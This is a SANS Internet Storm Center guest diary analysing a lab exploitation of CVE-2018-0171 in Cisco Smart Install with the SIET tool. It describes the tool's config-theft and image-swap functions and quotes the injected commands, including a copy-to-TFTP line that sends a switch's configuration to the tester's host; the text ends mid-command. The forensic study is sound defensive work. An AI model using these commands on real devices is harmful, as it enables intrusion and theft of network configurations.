---
title: Network Infraxploit &#x5b;Guest Diary&#x5d;, (Wed, Apr 9th)
url: https://isc.sans.edu/diary/rss/31844
source: SANS Internet Storm Center, InfoCON: green
date: 2025-04-11
fetch_date: 2025-10-06T22:06:52.508346
---

# Network Infraxploit &#x5b;Guest Diary&#x5d;, (Wed, Apr 9th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31840)
* [next](/diary/31850)

# [Network Infraxploit [Guest Diary]](/forums/diary/Network%2BInfraxploit%2BGuest%2BDiary/31844/)

**Published**: 2025-04-09. **Last Updated**: 2025-04-10 00:38:56 UTC
**by** [Guy Bruneau](/handler_list.html#guy-bruneau) (Version: 1)

[0 comment(s)](/diary/Network%2BInfraxploit%2BGuest%2BDiary/31844/#comments)

[This is a Guest Diary by Matthew Gorman, an ISC intern as part of the SANS.edu [BACS](https://www.sans.edu/cyber-security-programs/bachelors-degree/) program]

**Background**

I recently had the opportunity to get hands on with some Cisco networking devices. Due to being a network engineer prior to my current job as a network forensics analyst, I have a relatively solid understanding of these infrastructure devices and how they work. I wanted to write this blog detailing some of the critical oversights I see in my current job that are common for these devices and how they are abused by attackers that are also familiar with how they work. To demonstrate this I will be walking through a vulnerability that was first discovered in 2018 for these network Infrastructure devices, [CVE-2018-0171](https://nvd.nist.gov/vuln/detail/cve-2018-0171), a Remote Code Execution exploit targeting Cisco’s Smart Install feature.

**CVE-2018-0171**

Cisco’s Smart Install feature is a “plug and play”[[1](https://www.cisco.com/c/en/us/td/docs/switches/lan/smart_install/configuration/guide/smart_install/concepts.html)] configuration feature that allows for new networking devices to be deployed remotely and when plugged in they will configure themselves automatically without needing the support of a network administrator. This greatly eases the burden of network administrators needing to go on site where the device is to make the basic initial configuration changes to ensure it is remotely accessible.

The problem with smart install is three pronged. First, this feature is enabled by default on Cisco devices.[[2](https://www.nsa.gov/portals/75/documents/what-we-do/cybersecurity/professional-resources/orn-cisco-smart-install.pdf)] The second is that, by design, Smart Install protocol does not require authentication prior to use. The third, and last, prong is that due to the nature of the devices facilitating the flow of network traffic in and out of organizations, the port is often publicly accessible. In fact, doing a cursory search on [Censys](https://search.censys.io/) for this port and the service name associated with Cisco Smart Install (SMI) pulled up 1,239 devices with this service publicly accessible.

![](https://isc.sans.edu/diaryimages/images/Matthew_Gorman_pic1.png)

To be clear, this is not to say that all 1,239 of these devices are vulnerable to this particular CVE. This is simply illustrating the prevalence of publicly accessible devices running the Smart Install service.

So in 2018 when Cisco publishes a critical vulnerability with remote code execution capabilities that impacts a service that is designed to be open to the internet it becomes a popular exploit fast. The flaw in the smart install service allows an attacker to craft a packet with a Smart Install message that would be improperly validated, allowing the supplied command to be run without authentication.

In an effort to develop additional analytical insights into this attack I was able to get hands on with some outdated Cisco devices and pull an open source tool that targets this vulnerability called the Smart Install Exploit Tool (SIET)[[3](https://github.com/frostbits-security/SIET)].

**SIET Script Analysis**

For this use case, I used a Cisco Catalyst 3750 switch running on IOS 12.2.(55) SE11 firmware. Using the Cisco Software Checker tool,[[4](https://sec.cloudapps.cisco.com/security/center/softwarechecker.x)] I identified that this version of IOS had 32 different identified vulnerabilities to include 3 that were rated as “Critical”. One of those “Critical” vulnerabilities included CVE-2018-0171. Upon confirming the switch was vulnerable to CVE-2018-0171, I downloaded the SIET tool from GitHub to examine how it works. Looking at the python script that the Smart Install Exploit Tool (v3) is built on; SIET has several functions that exist to perform different actions towards the targeted device. These functions include:

conn\_with\_client
This sets a connection with the remote cisco device and prints different messages depending on the response from the targeted device.

test\_device
This creates a malicious Smart Install packet and calls the conn\_with\_client function to send it to the remote device.

change\_tftp
This function calls the conn\_with\_client function to connect to the targeted cisco device and depending on the set mode the Threat Actor (TA) selects performs different actions. The specified modes allow the actor to upload their own altered configuration file to replace the existing configuration file on the targeted device (or multiple devices, if specified), use TFTP to transfer the existing configuration file to the TA’s IP address, or have the targeted device download a potentially malicious or trojanized Cisco IOS image file from the TA’s IP address.

Summarily, this exploit tool provides a significant amount of capability to a Threat Actor seeking to gain access to an unpatched Cisco networking device hosting the Smart Install service.

**Packet Analysis**

After setting up the connection from my laptop to the Cisco 3750 switch. I configured the switch to turn on the Smart Install service by issuing the command “vstack”. This is configured by default but, in this case, had been turned off during previous testing. Issuing this command starts up a TCP listener on port 4786 that smart install uses to respond to Smart Install Director Requests. Smart Install Directors are a role in the Cisco Smart Install architecture that acts as a central management hub for all Smart Install enabled clients, in this case it is the Cisco 3750 switch.

Once the switch was configured, I fired up SIETv3 and ran the script with the flag “-h” to pull up the help menu.

![](https://isc.sans.edu/diaryimages/images/Matthew_Gorman_pic2.png)

As seen above this tool has several options that can be run against vulnerable Cisco networking devices. The one I used in this scenario was the “-g” flag to pull back the configuration of the device. Prior to running the command I started wireshark to make sure I captured the attack on a packet level.

After running the attack and successfully pulling back the configuration of the Cisco 3750 I stopped the packet capture. Below is a snippet from the packet capture that shows the structure of the attack from a high level.

![](https://isc.sans.edu/diaryimages/images/Matthew_Gorman_pic3.png)

Generally, the attack, as I had specified, follows a pattern of connecting to the Smart Install port (4786) and then using the Trivial File Transfer Protocol to then grab the contents of the running configuration of the Cisco switch.

Interestingly examining the TCP packets that are communicating on port 4786 There is a single packet that is much larger in length than the others. In this packet capture it is packet 43 with a length of 1102 bytes.

![](https://isc.sans.edu/diaryimages/images/Matthew_Gorman_pic4.png)

Examining the data portion of this packet reveals some interesting commands being issued from my laptop to the 3750. Specifically, my laptop is using the Smart Install port to first issue the command “copy system:running-config flash:/config.txt”. This command takes the running configuration file that exists in the system directory and copies it over to the flash directory with the name “config.text”. SIET then follows up this command with another one that says “copy flash:/config.text. tftp://192.1...